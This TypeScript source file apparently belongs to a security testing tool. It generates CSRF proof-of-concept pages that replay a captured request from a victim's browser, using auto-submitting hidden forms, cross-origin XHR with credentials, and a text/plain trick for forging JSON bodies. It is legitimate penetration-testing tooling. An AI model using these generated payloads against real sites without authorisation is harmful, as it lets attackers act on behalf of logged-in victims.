// CSRF PoC generator, aligned with Burp Suite's "Generate CSRF PoC" engagement
// tool. Given a request it produces HTML that triggers the same request from a
// victim's browser — cookies are deliberately omitted: the browser attaches
// them automatically, which is what makes the attack work.
//
// Two techniques, like Burp:
//  - form: an auto-submitting HTML form (GET / urlencoded POST — exact)
//  - xhr:  cross-origin XMLHttpRequest (any method / content type, but needs
//          the target's CORS policy to allow it)
// "auto" picks the most appropriate one and, when the technique cannot
// reproduce the request exactly, reports why (Burp shows the same warning).
import type { Header } from '../types'

export interface CsrfRequest {
  method: string
  url: string
  headers: Header[]
  bodyText: string
}

export type CsrfTechnique = 'auto' | 'form' | 'xhr'

export interface CsrfPocOptions {
  technique: CsrfTechnique
  /** include a script that submits the form on page load (form technique) */
  autoSubmit: boolean
  /** include a manual submit button inside the form (form technique) */
  submitButton: boolean
}

export interface CsrfPoc {
  html: string
  /** non-empty when the chosen technique cannot reproduce the request exactly */
  warnings: string[]
  /** the technique actually used (auto resolved) */
  used: 'form' | 'xhr'
}

/** HTML-escape a value for double-quoted attribute context */
const esc = (s: string) =>
  s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;')

/** JS string literal (JSON escaping is a valid JS literal and stays one line) */
const js = (s: string) => JSON.stringify(s)

/** lenient percent-decoding for urlencoded pairs ('+' means space) */
const dec = (x: string) => {
  try {
    return decodeURIComponent(x.replace(/\+/g, ' '))
  } catch {
    return x
  }
}

/** parse "a=1&b=2" into ordered pairs; keys without '=' get an empty value */
export function parseUrlencoded(body: string): [string, string][] {
  return body
    .split('&')
    .filter((p) => p.length > 0)
    .map((p) => {
      const i = p.indexOf('=')
      return i < 0 ? [dec(p), ''] : [dec(p.slice(0, i)), dec(p.slice(i + 1))]
    })
}

function contentTypeOf(headers: Header[]): string {
  return (headers.find((h) => h.name.toLowerCase() === 'content-type')?.value ?? '').trim()
}

/** an enctype=text/plain form sends `name=value` — to reproduce an arbitrary
 *  body, split it at the first '='. JSON bodies without one get a throwaway
 *  property injected so the split point exists (classic JSON CSRF trick). */
function plainTextFormInput(body: string): { name: string; value: string; warnings: string[] } {
  const warnings: string[] = []
  const eq = body.indexOf('=')
  if (eq >= 0) return { name: body.slice(0, eq), value: body.slice(eq + 1), warnings }
  // no '=' anywhere: try to tuck one into a JSON object as a dummy property
  const t = body.trimEnd()
  if (t.endsWith('}')) {
    try {
      const parsed = JSON.parse(t)
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
        const keys = Object.keys(parsed as Record<string, unknown>)
        const prop = ['x', 'poc', 'ignore', 'csrfPocDummy'].find((k) => !keys.includes(k)) ?? `x${keys.length}`
        return { name: `${t.slice(0, -1)},"${prop}":"`, value: '"}', warnings }
      }
    } catch {
      /* not JSON — fall through */
    }
  }
  warnings.push(
    'This body contains no "=" — a form with enctype="text/plain" always inserts one, so the request cannot be reproduced exactly. Edit the HTML or use the XHR technique.',
  )
  return { name: body, value: '', warnings }
}

const AUTO_SUBMIT = '    <script>\n      document.forms[0].submit();\n    </script>\n'

export function generateCsrfPoc(req: CsrfRequest, opts: CsrfPocOptions): CsrfPoc {
  const method = req.method.toUpperCase()
  const ct = contentTypeOf(req.headers)
  const ctBase = ct.split(';')[0].trim().toLowerCase()
  const body = req.bodyText
  const isFormEncoded = !!body && (ctBase === '' || ctBase === 'application/x-www-form-urlencoded')

  const useForm =
    opts.technique === 'form' ||
    (opts.technique === 'auto' && (method === 'GET' || ((method === 'POST' || method === '') && (isFormEncoded || !body))))

  if (!useForm) return xhrPoc(method, req.url, ct, body)
  return formPoc(method, req.url, body, ctBase, opts)
}

/** form technique — GET query params / urlencoded body become hidden inputs */
function formPoc(method: string, url: string, body: string, ctBase: string, opts: CsrfPocOptions): CsrfPoc {
  const warnings: string[] = []
  let u: URL
  try {
    u = new URL(url)
  } catch {
    u = new URL('http://example.com/')
  }

  if (method !== 'GET' && method !== 'POST') {
    warnings.push(`HTML forms can only send GET or POST — the ${method} request is issued as POST.`)
    method = 'POST'
  }

  let inputs: [string, string][] = []
  let enctype = ''
  let action: string
  if (method === 'GET') {
    // query params become hidden inputs; the form re-encodes them on submit
    action = u.origin + u.pathname
    inputs = [...u.searchParams.entries()]
  } else if (body && (ctBase === '' || ctBase === 'application/x-www-form-urlencoded')) {
    action = u.origin + u.pathname + u.search
    inputs = parseUrlencoded(body)
  } else if (body) {
    // non-form body (JSON, XML, …): text/plain + the name/value split trick
    action = u.origin + u.pathname + u.search
    enctype = ' enctype="text/plain"'
    const plain = plainTextFormInput(body)
    inputs = [[plain.name, plain.value]]
    warnings.push(
      `The original Content-Type (${ctBase || 'none'}) cannot be set by a form — the PoC sends text/plain. Targets that require the original type will reject it.`,
      ...plain.warnings,
    )
  } else {
    action = u.origin + u.pathname + u.search
  }

  const lines: string[] = [
    '<html>',
    '  <!-- CSRF PoC - generated by Pulse -->',
    '  <body>',
    `  <script>history.pushState('', '', '/')</script>`,
    `    <form action="${esc(action)}"${method === 'GET' ? '' : ` method="${method}"`}${enctype}>`,
  ]
  for (const [name, value] of inputs) {
    lines.push(`      <input type="hidden" name="${esc(name)}" value="${esc(value)}" />`)
  }
  if (opts.submitButton) lines.push(`      <input type="submit" value="Submit request" />`)
  lines.push('    </form>')
  if (opts.autoSubmit) lines.push(AUTO_SUBMIT.trimEnd())
  lines.push('  </body>', '</html>')

  return { html: lines.join('\n') + '\n', warnings, used: 'form' }
}

/** XHR technique — reproduces method, URL, Content-Type and body exactly, but
 *  a cross-origin send needs the target's CORS policy (non-form content types
 *  and custom headers trigger a preflight) */
function xhrPoc(method: string, url: string, ct: string, body: string): CsrfPoc {
  const warnings: string[] = []
  const ctBase = ct.split(';')[0].trim().toLowerCase()
  if (ctBase && ctBase !== 'application/x-www-form-urlencoded' && ctBase !== 'text/plain' && ctBase !== 'multipart/form-data') {
    warnings.push(
      `Cross-origin XHR with Content-Type "${ctBase}" triggers a CORS preflight — the PoC only fires when the target allows it. Cookies are sent via withCredentials.`,
    )
  } else if (method !== 'GET' && method !== 'POST' && method !== 'HEAD') {
    warnings.push(`Cross-origin XHR with method ${method} triggers a CORS preflight — the PoC only fires when the target allows it.`)
  }

  const lines: string[] = [
    '<html>',
    '  <!-- CSRF PoC - generated by Pulse -->',
    '  <body>',
    `  <script>history.pushState('', '', '/')</script>`,
    '    <script>',
    '      var xhr = new XMLHttpRequest();',
    `      xhr.open(${js(method)}, ${js(url)}, true);`,
  ]
  if (ct) lines.push(`      xhr.setRequestHeader('Content-Type', ${js(ct)});`)
  lines.push(
    '      xhr.withCredentials = true;',
    '      xhr.onload = function () {',
    '        // Response handling',
    '      };',
    body ? `      xhr.send(${js(body)});` : '      xhr.send();',
    '    </script>',
    '  </body>',
    '</html>',
  )
  return { html: lines.join('\n') + '\n', warnings, used: 'xhr' }
}
